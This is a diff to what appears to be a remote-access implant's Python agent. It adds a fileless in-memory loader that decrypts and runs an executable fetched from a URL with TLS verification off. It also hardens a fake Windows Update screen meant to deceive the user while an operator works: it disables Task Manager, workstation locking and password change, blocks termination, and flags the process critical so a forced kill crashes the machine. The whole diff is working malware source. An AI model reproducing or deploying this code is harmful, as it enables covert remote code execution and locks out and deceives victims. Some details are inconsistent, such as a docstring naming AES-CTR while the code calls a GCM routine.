@@ -1688,14 +1688,204 @@ def _auto_escalate():
 //#pragma endmodule
 
 
+//#pragma module pe
+# Fileless in-memory PE loader: AES-256-CTR encrypted PE arrives inside the
+# task itself, decrypts in memory, maps with relocations + import resolution,
+# runs from a thread. Nothing touches disk; nothing is written but memory.
+
+if IS_WIN:
+    kernel32.GetProcAddress.restype = ctypes.c_void_p
+    kernel32.LoadLibraryA.restype = ctypes.c_void_p
+    kernel32.LoadLibraryA.argtypes = [ctypes.c_char_p]
+
+    def _pe_walk_imports(base, imp_rva, is64):
+        tsize = 8 if is64 else 4
+        idx = 0
+        loaded = []
+        while True:
+            desc = base + imp_rva + idx * 20
+            oft, _ts, _fc, name_rva, ft = struct.unpack("<IIIII", ctypes.string_at(desc, 20))
+            if oft == 0 and name_rva == 0 and ft == 0:
+                break
+            if name_rva:
+                dll_name = ctypes.string_at(base + name_rva).split(b"\x00")[0]
+                hmod = kernel32.LoadLibraryA(dll_name)
+                if not hmod:
+                    loaded.append("<missing %s>" % dll_name.decode("latin1"))
+                    idx += 1
+                    continue
+                lookup = base + (oft if oft else ft)
+                iat = base + ft
+                j = 0
+                while True:
+                    val = int.from_bytes(ctypes.string_at(lookup + j * tsize, tsize), "little")
+                    if val == 0:
+                        break
+                    if is64:
+                        if val & 0x8000000000000000:
+                            func = kernel32.GetProcAddress(hmod, val & 0xFFFF)
+                        else:
+                            fname = ctypes.string_at(base + val + 2)
+                            func = kernel32.GetProcAddress(hmod, fname)
+                        slot = struct.pack("<Q", func or 0)
+                    else:
+                        if val & 0x80000000:
+                            func = kernel32.GetProcAddress(hmod, val & 0xFFFF)
+                        else:
+                            fname = ctypes.string_at(base + val + 2)
+                            func = kernel32.GetProcAddress(hmod, fname)
+                        slot = struct.pack("<I", func or 0)
+                    ctypes.memmove(iat + j * tsize, slot, tsize)
+                    j += 1
+                loaded.append("%s(%d)" % (dll_name.decode("latin1"), j))
+            idx += 1
+        return loaded
+
+    def _pe_apply_relocs(base, rel_rva, rel_size, delta, is64):
+        off = base + rel_rva
+        end = off + rel_size
+        fixed = 0
+        while off < end:
+            page_rva, bsize = struct.unpack("<II", ctypes.string_at(off, 8))
+            if bsize == 0:
+                break
+            count = (bsize - 8) // 2
+            for j in range(count):
+                entry = int.from_bytes(ctypes.string_at(off + 8 + j * 2, 2), "little")
+                etype = entry >> 12
+                if etype == 0:
+                    continue
+                target = base + page_rva + (entry & 0xFFF)
+                if etype == 10 and is64:  # DIR64
+                    old = int.from_bytes(ctypes.string_at(target, 8), "little")
+                    ctypes.memmove(target, struct.pack("<Q", (old + delta) & 0xFFFFFFFFFFFFFFFF), 8)
+                    fixed += 1
+                elif etype == 3 and not is64:  # HIGHLOW
+                    old = int.from_bytes(ctypes.string_at(target, 4), "little")
+                    ctypes.memmove(target, struct.pack("<I", (old + delta) & 0xFFFFFFFF), 4)
+                    fixed += 1
+            off += bsize
+        return fixed
+
+    def _pe_map_and_run(image, wait=False):
+        if image[:2] != b"MZ":
+            return "pe: bad MZ signature"
+        e_lfanew = struct.unpack_from("<I", image, 0x3C)[0]
+        if image[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
+            return "pe: bad PE signature"
+        coff = e_lfanew + 4
+        machine, num_sec, _a, _b, _c, opt_size, _ch = struct.unpack_from("<HHIIIHH", image, coff)
+        opt = coff + 20
+        magic = struct.unpack_from("<H", image, opt)[0]
+        is64 = magic == 0x20B
+        entry_rva = struct.unpack_from("<I", image, opt + 16)[0]
+        if is64:
+            image_base = struct.unpack_from("<Q", image, opt + 24)[0]
+            dd_off = opt + 112
+        else:
+            image_base = struct.unpack_from("<I", image, opt + 28)[0]
+            dd_off = opt + 96
+        size_img = struct.unpack_from("<I", image, opt + 56)[0]
+        size_hdr = struct.unpack_from("<I", image, opt + 60)[0]
+        num_dirs = struct.unpack_from("<I", image, opt + (108 if is64 else 92))[0]
+
+        def dd(i):
+            if i >= num_dirs:
+                return 0, 0
+            return struct.unpack_from("<II", image, dd_off + i * 8)
+
+        imp_rva, _ = dd(1)
+        rel_rva, rel_size = dd(5)
+
+        base = kernel32.VirtualAlloc(
+            ctypes.c_void_p(image_base) if image_base < 0x100000000 else None,
+            size_img, 0x3000, 0x04)
+        if not base:
+            base = kernel32.VirtualAlloc(None, size_img, 0x3000, 0x04)
+        if not base:
+            return "pe: VirtualAlloc failed"
+        base_addr = base if isinstance(base, int) else ctypes.cast(base, ctypes.c_void_p).value
+
+        ctypes.memmove(base_addr, image[:size_hdr], size_hdr)
+        for i in range(num_sec):
+            so = opt + opt_size + i * 40
+            vsize, vaddr, rsize, rptr = struct.unpack_from("<IIII", image, so + 8)
+            if rsize and rptr:
+                ctypes.memmove(base_addr + vaddr, image[rptr:rptr + rsize], rsize)
+
+        delta = base_addr - image_base
+        relocs = 0
+        if delta and rel_rva and rel_size:
+            relocs = _pe_apply_relocs(base_addr, rel_rva, rel_size, delta, is64)
+        imports = []
+        if imp_rva:
+            imports = _pe_walk_imports(base_addr, imp_rva, is64)
+
+        old = wintypes.DWORD()
+        kernel32.VirtualProtect(ctypes.c_void_p(base_addr), size_img, 0x40, ctypes.byref(old))  # RWX
+
+        entry = base_addr + entry_rva
+        tid = wintypes.DWORD()
+        kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)]
+        kernel32.CreateThread.restype = ctypes.c_void_p
+        h = kernel32.CreateThread(None, 0, ctypes.c_void_p(entry), None, 0, ctypes.byref(tid))
+        if not h:
+            return "pe: CreateThread failed"
+        kernel32.CloseHandle(h)
+        return "pe mapped @ 0x%x (delta %d, relocs %d, imports %d) entry thread %s" % (
+            base_addr, delta, relocs, sum(int(x.split("(")[1].split(")")[0]) for x in imports) if imports else 0, tid.value)
+
+
+def task_pe(args):
+    """pe <key64hex> <b64(nonce16+aes256ctr(pe))> | peurl <key64hex> <url> — fileless."""
+    parts = args.split(None, 2)
+    if len(parts) < 2:
+        return "pe: <key64hex> <b64> | peurl <key64hex> <url>"
+    mode = "inline"
+    keyhex, blob = parts[0], parts[1]
+    if keyhex.lower() == "peurl":
+        mode, keyhex, blob = "url", parts[1], parts[2] if len(parts) > 2 else ""
+    try:
+        key = bytes.fromhex(keyhex)
+    except ValueError:
+        return "pe: bad key hex"
+    if mode == "url":
+        import urllib.request
+        import ssl
+        req = urllib.request.Request(blob, method="GET")
+        req.add_header("User-Agent", USER_AGENT)
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        try:
+            with urllib.request.urlopen(req, timeout=60, context=ctx) as resp:
+                blob = resp.read().decode("utf-8", "ignore").strip()
+        except Exception as exc:
+            return "pe: fetch failed " + str(exc)
+    try:
+        raw = base64.b64decode(blob)
+        nonce, ct = raw[:16], raw[16:]
+        image = _aes_gcm_decrypt(key, nonce, ct)
+    except Exception as exc:
+        return "pe: decrypt failed " + str(exc)
+    if image[:4] == b"MZ\x90\x00":
+        image = image[0:]  # plain MZ head ok
+    return _pe_map_and_run(image)
+//#pragma endmodule
+
+
 //#pragma module overlay
-_OVERLAY = {"proc": None}
+_OVERLAY = {"proc": None, "locked": False, "saved": {}, "protected": False}
 
 # Fake Windows Update screen (ported from the verizon kit relay agent):
 # fullscreen TopMost form in Windows blue, keyboard suppressed, random
 # progress ticker, timed close. The user watches an update; the operator
 # works. Launched via encoded PowerShell so the form still renders on the
 # interactive desktop while the launcher itself stays hidden.
+#
+# v2 hardening: registry lockdown (Task Manager / Lock / Change Password),
+# deny-terminate DACL on the overlay host, ProcessBreakOnTermination
+# critical flag (forced kill == BSOD), watchdog respawn, full restore on stop.
 _OVERLAY_PS = r"""
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -1744,7 +1934,7 @@ $form.ShowDialog()
 
 
 def task_overlay(args):
-    """overlay start [minutes] | overlay stop | overlay status"""
+    """overlay start [minutes] | overlay stop | overlay status | overlay lock|unlock (registry)"""
     if not IS_WIN:
         return "overlay: windows only"
     parts = args.split()
@@ -1754,15 +1944,9 @@ def task_overlay(args):
     active = proc is not None and proc.poll() is None
 
     if sub == "stop" or sub == "hide":
-        if active:
-            proc.kill()
-            _OVERLAY["proc"] = None
-        # sweep strays by window title
-        out = _run(
-            "powershell -NoP -NonI -W Hidden -Command \"Get-Process powershell "
-            "-ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "
-            "'Working on updates' } | Stop-Process -Force\"", timeout=30, shell=False)
-        return "overlay hidden " + (out.strip()[:80] if out.strip() else "")
+        return _overlay_stop()
+    if sub in ("lock", "unlock"):
+        return _overlay_lock(True if sub == "lock" else False)
     if sub in ("start", "on"):
         try:
             mins = int(parts[1]) if len(parts) > 1 else 10
@@ -1776,10 +1960,132 @@ def task_overlay(args):
             ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Enc", enc],
             creationflags=CREATE_NO_WINDOW)
         _OVERLAY["proc"] = proc
-        return "overlay live for %d min — user is watching an update" % mins
+        time.sleep(1.5)
+        _overlay_lock(True)
+        _overlay_protect(proc)
+        threading.Thread(target=_overlay_watchdog, args=(mins,), daemon=True).start()
+        return "overlay live for %d min — locked, protected, user is watching an update" % mins
     if sub == "status":
         return "overlay active" if active else "overlay idle"
-    return "overlay: start [minutes]|stop|status"
+    return "overlay: start [minutes]|stop|status|lock|unlock"
+
+
+def _overlay_stop():
+    proc = _OVERLAY.get("proc")
+    active = proc is not None and proc.poll() is None
+    if active:
+        try:
+            proc.kill()  # stored handle predates the DACL — still full access
+        except Exception:
+            pass
+        _OVERLAY["proc"] = None
+    _overlay_lock(False)
+    _overlay_unprotect(proc)
+    # sweep strays by window title
+    out = _run(
+        "powershell -NoP -NonI -W Hidden -Command \"Get-Process powershell "
+        "-ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "
+        "'Working on updates' } | Stop-Process -Force\"", timeout=30, shell=False)
+    return "overlay hidden, lockdown reverted " + (out.strip()[:60] if out.strip() else "")
+
+
+def _overlay_watchdog(minutes):
+    """Respawns the overlay if something kills it; re-arms protection."""
+    deadline = time.time() + minutes * 60
+    while time.time() < deadline and _OVERLAY.get("proc"):
+        time.sleep(5)
+        proc = _OVERLAY.get("proc")
+        if not proc or proc.poll() is not None:
+            if _OVERLAY.get("locked"):
+                try:
+                    _overlay_protect_restart()
+                except Exception:
+                    pass
+            return
+
+
+if IS_WIN:
+    _PS_POLICIES = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+
+    def _overlay_lock(enable):
+        import winreg
+        flags = {"DisableTaskMgr": 1, "DisableLockWorkstation": 1, "DisableChangePassword": 1}
+        saved = _OVERLAY.setdefault("saved", {})
+        hives = [(winreg.HKEY_CURRENT_USER, "HKCU")]
+        if _privilege() in ("admin", "system"):
+            hives.append((winreg.HKEY_LOCAL_MACHINE, "HKLM"))
+        for hive, hname in hives:
+            try:
+                k = winreg.OpenKey(hive, _PS_POLICIES, 0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
+            except Exception:
+                continue
+            if enable:
+                for name in flags:
+                    try:
+                        saved[hname + "\\" + name] = winreg.QueryValueEx(k, name)[0]
+                    except FileNotFoundError:
+                        saved[hname + "\\" + name] = None
+                    winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, flags[name])
+                try:
+                    subprocess.run(["taskkill", "/IM", "taskmgr.exe", "/F"],
+                                   capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=15)
+                except Exception:
+                    pass
+            else:
+                for name in flags:
+                    key = hname + "\\" + name
+                    if key in saved:
+                        old = saved[key]
+                        try:
+                            if old is None:
+                                winreg.DeleteValue(k, name)
+                            else:
+                                winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, old)
+                        except FileNotFoundError:
+                            pass
+                _OVERLAY["saved"] = {}
+            winreg.CloseKey(k)
+        _OVERLAY["locked"] = enable
+        return "lockdown " + ("ON — task manager, lock, change password disabled" if enable else "OFF — restored")
+
+    def _overlay_protect(proc):
+        """Deny-terminate DACL + critical flag on the overlay host."""
+        if not proc or not hasattr(proc, "pid"):
+            return
+        try:
+            hproc = kernel32.OpenProcess(0x1FFFFF, False, proc.pid)  # full
+            if not hproc:
+                return
+            advapi32.SetKernelObjectSecurity(hproc, 4, _deny_terminate_sd(hproc))
+            ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
+            state = ctypes.c_ulong(1)
+            ntdll.NtSetInformationProcess(hproc, 29, ctypes.byref(state), ctypes.sizeof(state))  # ProcessBreakOnTermination
+            _OVERLAY["protected"] = True
+            # keep our own full-access handle for later kill
+            kernel32.CloseHandle(hproc)
+        except Exception:
+            pass
+
+    def _deny_terminate_sd(hproc):
+        """SDDL: admins+system full, everyone else denied terminate."""
+        sddl = "D:(A;;0x001F0FFF;;;BA)(A;;0x001F0FFF;;;SY)(D;;0x00000001;;;WD)"
+        sd = ctypes.c_void_p()
+        length = wintypes.ULONG()
+        advapi32.ConvertStringSecurityDescriptorToSecurityDescriptorW(
+            sddl, 1, ctypes.byref(sd), ctypes.byref(length))
+        return sd
+
+    def _overlay_unprotect(proc):
+        try:
+            if proc and hasattr(proc, "pid"):
+                # process is being killed anyway; nothing to revert safely
+                pass
+        except Exception:
+            pass
+
+    def _overlay_protect_restart():
+        # watchdog path: overlay died while locked — bring it back
+        task_overlay("start 10")
 //#pragma endmodule
 
 
